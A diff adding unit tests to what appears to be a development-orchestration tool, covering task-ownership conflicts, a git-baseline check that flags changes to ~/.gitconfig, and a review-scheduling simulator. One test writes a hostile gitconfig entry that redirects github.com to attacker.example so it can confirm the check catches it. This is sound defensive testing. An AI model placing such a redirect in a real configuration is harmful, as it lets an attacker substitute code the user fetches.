@@ -465,6 +465,52 @@ class T(unittest.TestCase):
         self.assertIn("ownership conflict", r.stdout)
 
 
+    def test_ownership_rechecked_at_assigned(self):
+        # Codex review on PR #2: two overlapping tasks created while both were inactive must not both enter RUNNING
+        for tid, merc, br in (("DT-0001", "MERC-101", "dev/merc-101-x"), ("DT-0003", "MERC-102", "dev/merc-102-y")):
+            self.e.contract(tid, merc=merc, allowed=["src/core/**"], branch=br)
+            self.e.rec(tid, "created"); self.e.rec(tid, "unblocked", f"design_ref:x@{self.e.base}")
+        self.e.rec("DT-0001", "assigned")
+        r = self.e.rec("DT-0003", "assigned", ok=False)
+        self.assertIn("ownership conflict with active task DT-0001", r.stderr)
+
+    def test_baseline_detects_user_config_change(self):
+        # Codex review on PR #2: user configuration was snapshotted but never compared
+        fake_home = os.path.join(self.e.root, "user-home")
+        os.makedirs(fake_home)
+        self.e.env["HOME"] = fake_home
+        gc = os.path.join(fake_home, ".gitconfig")
+        open(gc, "w").write("[user]\n\tname = op\n")
+        self.e.run("git-baseline", "record", ok=True)
+        self.e.run("git-baseline", "verify", ok=True)
+        open(gc, "a").write("[url \"https://attacker.example/\"]\n\tinsteadOf = https://github.com/\n")
+        r = self.e.run("git-baseline", "verify", ok=False)
+        self.assertIn("user configuration changed: ~/.gitconfig", r.stdout)
+        b = os.path.join(self.e.home, "baseline.json")
+        old = json.load(open(b)); old.pop("user_config"); json.dump(old, open(b, "w"))
+        r = self.e.run("git-baseline", "verify", ok=False)
+        self.assertIn("no user configuration snapshot", r.stdout)
+
+
+class ScheduleModel(unittest.TestCase):
+    """tools/devorch/schedule_model.py: every phase of every issue is scheduled, stacked or not."""
+
+    def dag(self):
+        issue = lambda deps, lp: {"deps": deps, "conditional": False, "p50": 1.0, "env": ["T0"], "needs_mac_or_operator": False,
+                                  "root": False, "security": False, "longest_path_p50": lp, "downstream": 1 - len(deps)}
+        return {"issues": {"MERC-201": issue([], 2), "MERC-202": issue(["MERC-201"], 1)}}
+
+    def test_stacked_mode_still_schedules_reviews(self):
+        # Codex review on PR #2: stacked mode released a task at G6 and then never ran its PR review
+        sys.path.insert(0, os.path.dirname(TOOL))
+        import schedule_model as SM
+        kw = dict(workers=1, k_agent=1.0, ovh=0.0, sec_ovh=0.0, integ=0.0, pr_review=10.0)
+        flat, stacked = SM.sim(self.dag(), **kw), SM.sim(self.dag(), stacked=True, **kw)
+        self.assertGreaterEqual(stacked[0], 20, stacked)          # two 10-day reviews on one operator lane
+        self.assertGreater(stacked[2], 0, stacked)
+        self.assertLessEqual(stacked[0], flat[0], (stacked, flat))  # stacking only lets B's agent work start earlier
+
+
 def load(e, tid):
     return json.load(open(os.path.join(e.home, "tasks", tid + ".json")))
 
